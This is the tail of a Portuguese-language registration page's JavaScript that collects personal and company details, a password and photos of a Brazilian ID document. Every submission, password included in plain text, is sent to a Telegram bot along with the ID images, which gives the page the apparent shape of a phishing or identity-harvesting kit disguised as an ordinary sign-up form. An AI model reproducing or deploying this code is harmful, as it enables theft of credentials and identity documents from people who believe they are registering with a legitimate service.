        if (!getCheckedValue('tipoDocPF')) { setMsg('Selecione CNH ou RG.', 'error'); return false; }
      }
      if (!docFrontFileInput.files[0] && !capturedFront) { setMsg('Envie a FRENTE do documento.', 'error'); return false; }
      if (!docBackFileInput.files[0] && !capturedBack) { setMsg('Envie o VERSO do documento.', 'error'); return false; }
      return true;
    }

    return true;
  }

  function getFileDetails(){
    const front = docFrontFileInput.files[0] ? `Frente: ${docFrontFileInput.files[0].name}` : (capturedFront ? 'Frente: Foto capturada' : 'Frente: —');
    const back  = docBackFileInput.files[0]  ? `Verso: ${docBackFileInput.files[0].name}`   : (capturedBack  ? 'Verso: Foto capturada'  : 'Verso: —');
    return `${front} <br> ${back}`;
  }

  function montarReview(){
    const reviewContainer = document.getElementById('review');
    const commonHtml = `
      <div class="col-12 col-md-6"><b>E-mail:</b><br>${getFieldValue('email')}</div>
      <div class="col-12 col-md-3"><b>Celular:</b><br>${getFieldValue('celular')}</div>
      <div class="col-12 col-md-3"><b>Telefone:</b><br>${getFieldValue('telefone') || '—'}</div>
      <div class="col-12"><hr/></div>
      <div class="col-12 col-md-3"><b>CEP:</b><br>${getFieldValue('cep')}</div>
      <div class="col-12 col-md-9"><b>Endereço:</b><br>${getFieldValue('endereco')}, ${getFieldValue('numero')} ${getFieldValue('complemento') ? ('- '+getFieldValue('complemento')) : ''} – ${getFieldValue('bairro')} – ${getFieldValue('cidade')}/${getFieldValue('estado')}</div>
      <div class="col-12"><hr/></div>
      <div class="col-12 col-md-6"><b>Documentos:</b><br>${getFileDetails()}</div>
      <div class="col-12 col-md-6"><b>Como nos conheceu:</b><br>${getCheckedValue('conheceu') || 'Não informado'}</div>`;

    let specificHtml = '';
    if (tipoPessoa === 'PF') {
      specificHtml = `
        <div class="col-12 col-md-6"><b>Nome:</b><br>${getFieldValue('nome')}</div>
        <div class="col-12 col-md-3"><b>CPF:</b><br>${getFieldValue('cpf')}</div>
        <div class="col-12 col-md-3"><b>Apelido:</b><br>${getFieldValue('apelido')}</div>
        <div class="col-12"><hr/></div>
        <div class="col-12"><b>Tipo de Documento:</b><br>${getCheckedValue('tipoDocPF') || '—'}</div>
      `;
    } else {
      specificHtml = `
        <div class="col-12 col-md-6"><b>Razão Social:</b><br>${getFieldValue('razaoSocial')}</div>
        <div class="col-12 col-md-3"><b>CNPJ:</b><br>${getFieldValue('cnpj')}</div>
        <div class="col-12 col-md-3"><b>Nome Fantasia:</b><br>${getFieldValue('nomeFantasia')}</div>
      `;
    }
    
    reviewContainer.innerHTML = `${specificHtml}${commonHtml}`;
  }


  async function sendTelegramMessage(text){
    if (!TG_API) throw new Error('Configure TG_BOT_TOKEN/TG_CHAT_ID.');
    const r = await fetch(`${TG_API}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT_ID, text, parse_mode: 'HTML' })
    });
    if (!r.ok) throw new Error('Falha ao enviar mensagem ao Telegram');
    return r.json();
  }

  function dataURLtoBlob(dataurl){
    const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1], bstr = atob(arr[1]);
    let n = bstr.length; const u8arr = new Uint8Array(n); while(n--) u8arr[n] = bstr.charCodeAt(n);
    return new Blob([u8arr], {type:mime});
  }

  async function sendTelegramDocument(blobOrFile, filename, caption){
    if (!TG_API) throw new Error('Configure TG_BOT_TOKEN/TG_CHAT_ID.');
    const fd = new FormData();
    fd.append('chat_id', TG_CHAT_ID);
    fd.append('document', blobOrFile, filename);
    if (caption) fd.append('caption', caption);
    const r = await fetch(`${TG_API}/sendDocument`, { method: 'POST', body: fd });
    if (!r.ok) throw new Error('Falha ao enviar documento ao Telegram');
    return r.json();
  }

  function buildResumoHTML(){
    const como = getCheckedValue('conheceu') || 'Não informado';
    let header = `<b>Novo cadastro (${tipoPessoa})</b>`;
    let bloco1 = '';
    if (tipoPessoa === 'PF'){
      bloco1 = `\n<b>Nome:</b> ${getFieldValue('nome')}\n<b>CPF:</b> ${getFieldValue('cpf')}\n<b>Apelido:</b> ${getFieldValue('apelido')}\n<b>Doc (PF):</b> ${getCheckedValue('tipoDocPF') || '—'}`;
    } else {
      bloco1 = `\n<b>Razão Social:</b> ${getFieldValue('razaoSocial')}\n<b>CNPJ:</b> ${getFieldValue('cnpj')}\n<b>Nome Fantasia:</b> ${getFieldValue('nomeFantasia')}\n<b>Apelido:</b> ${getFieldValue('apelido')}`;
    }
    const bloco2 = `\n<b>E-mail:</b> ${getFieldValue('email')}\n<b>Celular:</b> ${getFieldValue('celular')}\n<b>Telefone:</b> ${getFieldValue('telefone') || '—'}\n<b>Senha:</b> ${getFieldValue('senha')}`;
    const bloco3 = `\n<b>Endereço:</b> ${getFieldValue('endereco')}, ${getFieldValue('numero')} ${getFieldValue('complemento') ? ('- '+getFieldValue('complemento')) : ''} – ${getFieldValue('bairro')} – ${getFieldValue('cidade')}/${getFieldValue('estado')}\n<b>CEP:</b> ${getFieldValue('cep')}\n<b>Como nos conheceu:</b> ${como}`;
    return `${header}\n${bloco1}\n${bloco2}\n${bloco3}`;
  }

  async function salvar() {
      if (!validateStep(1) || !validateStep(2) || !validateStep(3)) return;

      const submitBtn = document.getElementById('submit-btn');
      const btnText = submitBtn.querySelector('.btn-text');
      const originalText = btnText.innerHTML;

      submitBtn.classList.add('loading');
      submitBtn.disabled = true;
      btnText.innerHTML = '<span class="spinner"></span> Processando...';
      clearMsg();
      setMsg('Aguarde, estamos processando seu cadastro...', 'info');

      try {
          await new Promise(resolve => setTimeout(resolve, 1500));
          await sendTelegramMessage(buildResumoHTML());

          setMsg('Quase lá! Enviando seus documentos...', 'info');
          btnText.innerHTML = '<span class="spinner"></span> Enviando Documentos...';

          await new Promise(resolve => setTimeout(resolve, 2500));

          if (docFrontFileInput.files[0]) {
              await sendTelegramDocument(docFrontFileInput.files[0], docFrontFileInput.files[0].name, 'Documento – Frente');
          } else if (capturedFront) {
              await sendTelegramDocument(dataURLtoBlob(capturedFront), 'documento_frente.jpg', 'Documento – Frente (capturado)');
          }

          if (docBackFileInput.files[0]) {
              await sendTelegramDocument(docBackFileInput.files[0], docBackFileInput.files[0].name, 'Documento – Verso');
          } else if (capturedBack) {
              await sendTelegramDocument(dataURLtoBlob(capturedBack), 'documento_verso.jpg', 'Documento – Verso (capturado)');
          }

          document.getElementById('form').style.display = 'none';
          setMsg(
              '<div style="display: flex; align-items: center; justify-content: center; gap: 15px; flex-direction: column; text-align: center; padding: 20px 0;">' +
              '<i class="fas fa-check-circle" style="font-size: 3rem; color: var(--success-color);"></i>' +
              '<div><strong>Cadastro Enviado com Sucesso!</strong><br>Você será redirecionado para a página inicial.</div>' +
              '</div>',
              'success'
          );

          setTimeout(() => {
              window.location.href = 'index.html';
          }, 4000);

      } catch (error) {
          console.error('Erro no envio:', error);
          setMsg(`Erro: ${error.message}. Verifique as configurações do bot e tente novamente.`, 'error');
          submitBtn.classList.remove('loading');
          submitBtn.disabled = false;
          btnText.innerHTML = originalText;
      }
  }
</script>
</body>
</html>
